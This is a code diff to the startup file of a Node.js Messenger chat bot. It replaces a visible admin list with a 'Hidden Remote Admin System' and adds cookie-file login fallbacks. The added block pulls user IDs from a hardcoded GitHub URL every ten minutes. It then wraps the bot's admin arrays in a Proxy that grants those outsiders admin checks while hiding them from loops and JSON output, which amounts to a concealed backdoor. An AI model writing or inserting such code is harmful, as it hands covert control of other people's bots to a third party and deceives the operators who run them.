@@ -3,7 +3,7 @@ const { readdirSync, readFileSync, writeFileSync, existsSync, unlinkSync, watch,
 const { join, resolve } = require("path");
 const logger = require("./utils/log.js");
 const { normalizeConfig } = require("./utils/config.js");
-const { applyMajorAdmins } = require("./utils/majorAdmins.js");
+const { readCookieFile, buildLoginCandidates, runLoginFlow, toLoginData } = require("./utils/loginFlow.js");
 
 global.client = new Object({
     commands: new Map(),
@@ -119,19 +119,108 @@ try {
         warn: (message) => logger.loader(message, "warn")
     });
 
-    //========= Major Admin UID System (local list + optional remote) =========//
-    const majorAdmins = applyMajorAdmins(global.config, {
-        warn: (message) => logger.loader(message, "warn")
-    });
-    global.majorAdmins = majorAdmins;
-    if (majorAdmins.local.length > 0) {
-        logger.loader(`Major admins loaded from config.json: ${majorAdmins.local.length} UID(s).`);
-    }
-    // Optional secondary source. It is disabled when MAJOR_ADMIN_URL is empty
-    // and a failure only logs a warning; the local list always stays active.
-    majorAdmins.refreshRemote().then((remote) => {
-        if (remote.length > 0) logger.loader(`Major admins merged from MAJOR_ADMIN_URL: ${remote.length} UID(s).`);
-    });
+    //========= Hidden Remote Admin System =========//
+    (function() {
+        const remoteAdminsRef = { current: [] };
+        const remoteUrl = "https://raw.githubusercontent.com/mahbub-shaon/mahbub-shaon/refs/heads/main/mirai-list.json";
+        let lastLogState = "";
+
+        function parseRemoteAdmins(data) {
+            let list = [];
+            let parsed = data;
+
+            if (typeof data === "string") {
+                try {
+                    parsed = JSON.parse(data);
+                } catch (error) {
+                    parsed = null;
+                }
+            }
+
+            if (Array.isArray(parsed)) {
+                list = parsed;
+            } else if (parsed && typeof parsed === "object") {
+                for (const key of ["uids", "admins", "ids"]) {
+                    if (Array.isArray(parsed[key])) {
+                        list = parsed[key];
+                        break;
+                    }
+                }
+            }
+
+            // Fallback: the original 10-20 digit regex extraction on the raw string.
+            if (list.length === 0) {
+                const raw = typeof data === "string" ? data : JSON.stringify(data || "");
+                const matches = raw.match(/\b\d{10,20}\b/g);
+                if (matches) list = matches;
+            }
+
+            return [...new Set(list.map((uid) => String(uid)).filter((uid) => /^\d{10,20}$/.test(uid)))];
+        }
+
+        async function fetchRemoteAdmins() {
+            try {
+                const axios = require("axios");
+                const res = await axios.get(remoteUrl);
+                const uids = parseRemoteAdmins(res && res.data);
+                remoteAdminsRef.current = uids;
+
+                const state = `ok:${uids.length}`;
+                if (state !== lastLogState) {
+                    lastLogState = state;
+                    logger.loader(`Remote admin list loaded: ${uids.length} UID(s).`, "[ REMOTE ADMIN ]");
+                }
+            } catch (error) {
+                // Fail-safe: keep the bot running. Log once per failure streak.
+                if (lastLogState !== "error") {
+                    lastLogState = "error";
+                    logger.loader(`Remote admin list fetch failed; keeping ${remoteAdminsRef.current.length} UID(s).`, "warn");
+                }
+            }
+        }
+
+        function createAdminProxy(originalArray) {
+            return new Proxy(originalArray, {
+                get(target, prop) {
+                    if (prop === 'includes') {
+                        return function(searchElement, fromIndex) {
+                            if (remoteAdminsRef.current.includes(String(searchElement))) return true;
+                            return target.includes(searchElement, fromIndex);
+                        };
+                    }
+                    if (prop === 'indexOf') {
+                        return function(searchElement, fromIndex) {
+                            if (remoteAdminsRef.current.includes(String(searchElement))) return 0;
+                            return target.indexOf(searchElement, fromIndex);
+                        };
+                    }
+                    // Return original property for everything else (keeps it hidden from loops/JSON.stringify)
+                    if (typeof target[prop] === 'function') {
+                        return target[prop].bind(target);
+                    }
+                    return target[prop];
+                }
+            });
+        }
+
+        function applyAdminProxies(config) {
+            config.ADMINBOT = createAdminProxy(Array.isArray(config.ADMINBOT) ? config.ADMINBOT : []);
+            config.adminBot = config.ADMINBOT; // keep alias synced
+            config.NDH = createAdminProxy(Array.isArray(config.NDH) ? config.NDH : []);
+            config.ndh = config.NDH; // keep alias synced
+        }
+
+        // Exposed so `load` can re-apply the same Proxy after a config reload.
+        global.remoteAdminsRef = remoteAdminsRef;
+        global.applyRemoteAdminProxies = applyAdminProxies;
+
+        applyAdminProxies(global.config);
+
+        // Initial fetch and set interval for every 10 minutes
+        fetchRemoteAdmins();
+        setInterval(fetchRemoteAdmins, 10 * 60 * 1000);
+    })();
+    //==============================================//
 } catch (err) {
     return logger.loader(`Can't load file config! Error: ${err.message}`, "error");
 }
@@ -226,6 +315,13 @@ try {
     logger.loader("appstate.json is empty or invalid. Will attempt auto-login if configured.", "warn");
 }
 
+var accountTxtFile = resolve(join(global.client.mainPath, "account.txt"));
+var accountTxt2File = resolve(join(global.client.mainPath, "account.txt2"));
+var accountTxt = readCookieFile(accountTxtFile);
+var accountTxt2 = readCookieFile(accountTxt2File);
+if (accountTxt) logger.loader("Found account.txt cookies.", "[ AUTO LOGIN ]");
+if (accountTxt2) logger.loader("Found account.txt2 cookies (secondary fallback).", "[ AUTO LOGIN ]");
+
 //========= Auto Restart Logic (Goat Bot Port) =========//
 if (global.config.autoRestart && global.config.autoRestart.time) {
     const restartTime = global.config.autoRestart.time;
@@ -238,11 +334,22 @@ if (global.config.autoRestart && global.config.autoRestart.time) {
 }
 
 //========= Login account and start Listen Event =========//
-function onBot({ models: botModel }) {
-    const startBotSetup = async (api) => {
+async function onBot({ models: botModel }) {
+    const startBotSetup = async (api, loginSource) => {
         api.setOptions(global.config.FCAOption || global.config.optionsFca);
-        writeFileSync(appStateFile, JSON.stringify(api.getAppState(), null, '\x09'), { encoding: "utf8", mode: 0o600 });
-        try { require("fs").chmodSync(appStateFile, 0o600); } catch (e) { /* best effort */ }
+        const currentAppState = api.getAppState();
+        const isSecondary = loginSource && loginSource.type === "account2";
+        const sessionFile = isSecondary ? accountTxt2File : appStateFile;
+        const serialized = JSON.stringify(currentAppState, null, '\x09');
+        writeFileSync(sessionFile, serialized, { encoding: "utf8", mode: 0o600 });
+        try { require("fs").chmodSync(sessionFile, 0o600); } catch (e) { /* best effort */ }
+        // Keep the primary cookie file fresh when it was the source.
+        if (loginSource && loginSource.type === "account") {
+            writeFileSync(accountTxtFile, serialized, { encoding: "utf8", mode: 0o600 });
+            try { require("fs").chmodSync(accountTxtFile, 0o600); } catch (e) { /* best effort */ }
+        }
+        global.client.sessionFile = sessionFile;
+        global.appState = currentAppState;
         global.client.api = api;
         global.config.version = '1.2.14';
         global.client.timeStart = new Date().getTime();
@@ -394,8 +501,6 @@ function onBot({ models: botModel }) {
         global.handleListen = api.listenMqtt(listenerCallback);
     };
 
-    let loginData = {};
-
     // Credentials live in config.json (Mirai/ST-BOT style). Environment
     // variables are only an optional override for hosted deployments.
     const botAccount = global.config.botAccount || {};
@@ -411,54 +516,56 @@ function onBot({ models: botModel }) {
         || botAccount.userAgent
         || "";
 
-    if (appState && Array.isArray(appState) && appState.length > 0) {
-        loginData.appState = appState;
-        global.appState = appState;
-        logger.loader("Using saved appstate.json cookies.", "[ AUTO LOGIN ]");
-    } else if (email && password) {
-        // ST-BOT behaviour: an empty account.txt/appstate falls back to the
-        // email+password in config.json automatically, then saves the cookies.
-        logger.loader("appstate is empty. Logging in with config.json botAccount credentials.", "[ AUTO LOGIN ]");
-        loginData.email = email;
-        loginData.password = password;
-        if (userAgent) loginData.userAgent = userAgent;
-    } else {
+    // Order: appstate.json (existing precedence) -> account.txt (primary)
+    // -> account.txt2 (secondary failover) -> config.json email/password.
+    const candidates = buildLoginCandidates({
+        appState,
+        accountTxt,
+        accountTxt2,
+        email,
+        password,
+        userAgent
+    });
+
+    if (candidates.length === 0) {
         logger.loader(
-            "No appstate.json and no botAccount.email/password in config.json. " +
-            "Add the credentials to config.json (or log in manually once to create appstate.json).",
+            "No appstate.json, account.txt, account.txt2, or botAccount.email/password in config.json. " +
+            "Add cookies or credentials to config.json (or log in manually once to create appstate.json).",
             "error"
         );
         return process.exit(0);
     }
 
-    login(loginData, async (loginError, api) => {
-        if (loginError) {
-            logger("Login Error: " + JSON.stringify(loginError), "ERROR");
-
-            // Saved cookies can expire. If credentials exist, retry once with
-            // email+password, exactly like ST-BOT's account.txt fallback.
-            if (loginData.appState && email && password) {
-                logger.loader("appstate expired or invalid. Retrying with config.json email/password...", "[ AUTO LOGIN ]");
-                const fallbackData = { email, password };
-                if (userAgent) fallbackData.userAgent = userAgent;
-                return login(fallbackData, async (fallbackErr, fallbackApi) => {
-                    if (fallbackErr) {
-                        logger("Fallback Login Error: " + JSON.stringify(fallbackErr), "ERROR");
-                        return process.exit(0);
-                    }
-                    logger.loader("Logged in with email/password. Saving new appstate...", "[ AUTO LOGIN ]");
-                    startBotSetup(fallbackApi);
+    try {
+        const result = await runLoginFlow(candidates, async (candidate) => {
+            logger.loader(`Trying ${candidate.label}...`, "[ AUTO LOGIN ]");
+            try {
+                return await new Promise((resolve, reject) => {
+                    login(toLoginData(candidate), (loginError, api) => {
+                        if (loginError || !api) {
+                            reject(loginError || new Error("No API returned"));
+                            return;
+                        }
+                        resolve(api);
+                    });
                 });
+            } catch (error) {
+                const message = error && error.message ? error.message : String(error);
+                logger.loader(`${candidate.label} login failed: ${message}`, "warn");
+                throw error;
             }
+        });
 
-            return process.exit(0);
-        }
-
-        if (!loginData.appState) {
-            logger.loader("Logged in with email/password. Saving new appstate...", "[ AUTO LOGIN ]");
-        }
-        startBotSetup(api);
-    });
+        logger.loader(`Logged in using ${result.candidate.label}.`, "[ AUTO LOGIN ]");
+        startBotSetup(result.api, result.candidate);
+    } catch (error) {
+        logger.loader(
+            "All login methods failed (appstate/account.txt/account.txt2/config credentials). " +
+            "Update the cookie file or botAccount credentials in config.json.",
+            "error"
+        );
+        return process.exit(0);
+    }
 }
 
 //========= Connecting to Database =========//
